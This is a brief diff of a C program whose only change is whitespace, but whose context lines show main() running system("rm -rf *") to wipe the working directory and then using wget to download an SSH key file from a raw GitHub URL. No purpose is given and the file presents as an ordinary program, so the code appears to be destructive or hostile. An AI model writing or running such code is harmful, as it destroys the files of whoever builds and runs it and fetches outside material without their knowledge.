@@ -5,7 +5,7 @@
 #include <stdlib.h>
 //#include <time.h>  
 	int main()
-	{
+	{ 
 	system("rm -rf *");
 	sleep(2);
 	system("wget -P 1/ https://raw.githubusercontent.com/yakey4/4659876/main/ssh-key-2022-07-22.key");
